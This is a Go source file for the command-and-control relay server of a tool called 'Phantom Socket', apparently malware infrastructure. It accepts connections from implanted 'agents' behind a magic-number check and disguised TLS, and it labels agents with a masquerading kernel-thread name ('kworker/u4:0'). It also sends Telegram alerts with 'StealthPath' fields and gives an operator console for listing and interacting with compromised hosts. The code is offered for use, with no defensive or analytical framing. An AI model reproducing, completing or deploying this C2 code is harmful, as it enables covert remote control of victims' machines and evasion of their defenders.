// Project: Phantom Socket v1.0.1-stable
// Module: C2 Component
// Description: C2 Infrastructure component (Gacor Edition).

package main

import (
	"crypto/tls"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"github.com/soket-io/gs-oyen-r/internal/config"
	"github.com/soket-io/gs-oyen-r/internal/crypto"
	"github.com/soket-io/gs-oyen-r/internal/peer"
	"github.com/soket-io/gs-oyen-r/internal/telegram"
	"github.com/soket-io/gs-oyen-r/internal/tls_mimic"
)

var (
	logger         *log.Logger
	activePeer     net.Conn
	activePeerID   string
	peerMutex      sync.Mutex
	consoleMode    bool
	promptMutex    sync.Mutex
	relayTLSConfig *tls.Config
)

type crlfWriter struct {
	writer io.Writer
}

func (w *crlfWriter) Write(p []byte) (n int, err error) {
	promptMutex.Lock()
	defer promptMutex.Unlock()

	if consoleMode {
		fmt.Print("\r\033[K")
	}

	buf := make([]byte, 0, len(p)*2)
	for i := 0; i < len(p); i++ {
		if p[i] == '\n' && (i == 0 || p[i-1] != '\r') {
			buf = append(buf, '\r', '\n')
		} else {
			buf = append(buf, p[i])
		}
	}

	n, err = w.writer.Write(buf)

	if consoleMode {
		redrawPrompt()
	}

	return n, err
}

func redrawPrompt() {
	prompt := "phantom> "
	peerMutex.Lock()
	currentPeerID := activePeerID
	peerMutex.Unlock()

	if currentPeerID != "" {
		shortID := currentPeerID
		if len(shortID) > 13 {
			shortID = shortID[:13]
		}
		prompt = fmt.Sprintf("phantom(%s)> ", shortID)
	}
	fmt.Print(prompt)
}

func generateID(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func main() {
	rand.Seed(time.Now().UnixNano())
	cfg := config.LoadFromEnv()
	flag.StringVar(&cfg.ListenAddr, "listen", ":8443", "Relay server listen address")
	flag.Parse()

	logger = log.New(&crlfWriter{writer: os.Stderr}, "", log.LstdFlags)

	logger.Println("Phantom Socket v1.0.1-stable Relay Server Starting...")
	logger.Println("Building with Go 1.22+ for high-performance concurrency")

	cert, err := crypto.GenerateSelfSignedCert("oyen.serveftp.com", nil)
	if err != nil {
		logger.Fatalf("Failed to generate certificate: %v", err)
	}

	tlsConfig, err := tls_mimic.CreateRelayTLSConfig(cert)
	if err != nil {
		logger.Fatalf("Failed to create TLS config: %v", err)
	}
	relayTLSConfig = tlsConfig

	listener, err := net.Listen("tcp", cfg.ListenAddr)
	if err != nil {
		logger.Fatalf("Failed to start listener: %v", err)
	}
	defer listener.Close()

	logger.Printf("Relay server listening on %s (Hybrid PSK+TLS mode)", cfg.ListenAddr)

	registry := peer.NewRegistry()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Print("\r\033[K")
		logger.Println("Shutting down relay server...")
		registry.CleanupInactivePeers(0)
		os.Exit(0)
	}()

	go startInteractiveConsole(registry, cfg)

	for {
		conn, err := listener.Accept()
		if err != nil {
			logger.Printf("Failed to accept connection: %v", err)
			continue
		}

		go handleConnection(conn, registry, cfg)
	}
}

func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config) {
	defer func() {
		if r := recover(); r != nil {
			conn.Close()
		}
	}()

	pskBuf := make([]byte, 4)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	if _, err := io.ReadFull(conn, pskBuf); err != nil {
		conn.Close()
		return
	}

	if binary.BigEndian.Uint32(pskBuf) != 0x4F59454E {
		conn.Close()
		return
	}

	remoteAddr := conn.RemoteAddr().String()

	tlsConn := tls.Server(conn, relayTLSConfig)
	tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
	if err := tlsConn.Handshake(); err != nil {
		tlsConn.Close()
		return
	}
	conn = tlsConn

	peerID := generateID(16)
	_, err := registry.AddPeer(peerID, conn)
	if err != nil {
		logger.Printf("Failed to register agent: %v", err)
		conn.Close()
		return
	}

	logger.Printf("[+] Agent authenticated successfully from %s", remoteAddr)
	logger.Printf("[+] Agent Online [kworker/u4:0] (ID: %s)", peerID)

	telegram.SendAlert(telegram.AlertData{
		Type:          "v1.0.1-stable ONLINE",
		Hostname:      "N/A",
		User:          "N/A",
		IP:            remoteAddr,
		StealthPath:   "N/A",
		ActionDetails: fmt.Sprintf("Agent %s is now online and registered.", peerID),
		PID:           0,
		Arch:          "N/A",
	})

	handlePeer(conn, peerID, registry)
}

func handlePeer(conn net.Conn, peerID string, registry *peer.Registry) {
	defer registry.RemovePeer(peerID)
	
	buf := make([]byte, 4096)
	for {
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		n, err := conn.Read(buf)
		if err != nil {
			if err != io.EOF {
				logger.Printf("Connection error with agent %s: %v", peerID, err)
			}
			return
		}
		_ = n
	}
}

func startInteractiveConsole(registry *peer.Registry, cfg *config.Config) {
	consoleMode = true
	fmt.Println("Phantom Socket v1.0.1-stable Relay Console")
	fmt.Println("Type 'help' for available commands.")
	fmt.Println()
	redrawPrompt()

	var input string
	for {
		_, err := fmt.Scanln(&input)
		if err != nil {
			if err != io.EOF {
				redrawPrompt()
			}
			continue
		}

		switch input {
		case "help", "?":
			fmt.Println("Commands:")
			fmt.Println("  sessions, list    - List all connected agents")
			fmt.Println("  interact <id>     - Interact with specific agent")
			fmt.Println("  help              - Show this help message")
			fmt.Println("  exit, quit        - Shutdown relay server")
		case "sessions", "list", "peers", "agents":
			peers := registry.GetActivePeers()
			if len(peers) == 0 {
				fmt.Println("[*] No active agents.")
			} else {
				fmt.Printf("[*] %d active agent(s):\n", len(peers))
				for _, p := range peers {
					fmt.Printf("    [+] %s | %s\n", p.PeerID, p.RemoteAddr)
				}
			}
		case "interact":
			fmt.Println("[*] Interact command: specify agent ID")
		case "exit", "quit":
			fmt.Println("[*] Shutting down relay server...")
			os.Exit(0)
		default:
			if input != "" {
				fmt.Printf("[*] Unknown command: %s (type 'help' for commands)\n", input)
			}
		}
		redrawPrompt()
	}
}
